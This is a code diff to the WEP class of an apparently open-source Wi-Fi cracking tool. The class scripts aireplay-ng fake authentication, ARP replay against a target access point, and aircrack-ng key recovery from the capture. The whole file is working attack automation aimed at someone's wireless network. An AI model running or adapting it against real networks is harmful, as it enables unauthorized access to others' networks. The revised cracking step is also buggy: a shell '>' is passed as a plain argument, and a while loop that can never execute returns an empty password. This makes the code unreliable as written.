@@ -13,7 +13,7 @@ import threading
 
 
 class WEP(EncryptionType):
-    def __init__(self, network, interface, mac, verbose_level, silent_attack):
+    def __init__(self, network, interface, mac, verbose_level, silent_attack, write_directory):
         """
         Constructor for the WEP class (also calls the parent constructor)
         :param network: target network for the attack
@@ -23,11 +23,11 @@ class WEP(EncryptionType):
 
         :Author: Miguel Yanes Fernández
         """
-        EncryptionType.__init__(self, network, interface, verbose_level, silent_attack)
+        EncryptionType.__init__(self, network, interface, verbose_level, silent_attack, write_directory)
         # super().__init__(self, network, interface)
         self.mac = mac
 
-    def scan_network(self, write_directory):
+    def scan_network(self):
         """
         Method to scan the target network. With the selected attacker's mac, makes a fake authentication to the network
         to then send arp responses to generate data.
@@ -36,13 +36,13 @@ class WEP(EncryptionType):
 
         :Author: Miguel Yanes Fernández
         """
-        super(WEP, self).scan_network(write_directory)
+        super(WEP, self).scan_network()
 
         if not self.silent_attack:
-            fakeauth_cmd = ['aireplay-ng', '--fakeauth', '0', '-b', self.bssid, '-e', self.essid, '-T', '3', self.interface,
-                            '-h', self.mac]
+            fakeauth_cmd = ['aireplay-ng', '--fakeauth', '0', '-b', self.bssid, '-e', self.essid, '-T', '3',
+                            self.interface, '-h', self.mac]
             arpreplay_cmd = ['aireplay-ng', '--arpreplay', '-b', self.bssid, '-h', self.mac,
-                            '--ignore-negative-one', self.interface]
+                             '--ignore-negative-one', self.interface]
 
             fakeauth_out, err = self.execute_command(fakeauth_cmd)
             self.show_message("Faked authentication on ap: " + self.bssid + " with MAC: " + self.mac)
@@ -98,11 +98,17 @@ class WEP(EncryptionType):
 
         :Author: Miguel Yanes Fernández
         """
-        aircrack_cmd = ['aircrack-ng', '/tmp/WiCC/net_attack-01.cap']
+        aircrack_cmd = ['aircrack-ng', self.write_directory + '/net_attack-01.cap',
+                        '>', self.write_directory + '/aircrack-out']
         self.show_message("---------Executing aircrack-----------")
-        crack_out, crack_err = super().execute_command(aircrack_cmd)
-        self.show_message(crack_out.decode('utf-8'))
-        # will need to filter the output from aircrack
-        password = self.filter_aircrack(crack_out.decode('utf-8'))
+        aircrack_thread = threading.Thread(target=self.execute_command, args=(aircrack_cmd,))
+        aircrack_thread.start()
+        aircrack_thread.join()
+
+        password = ""
+
+        while password != "":
+            with open(self.write_directory + '/aircrack-out', 'r') as aircrack_out:
+                password = self.filter_aircrack(aircrack_out.read())
         self.show_message("--------------------------------------")
         return password
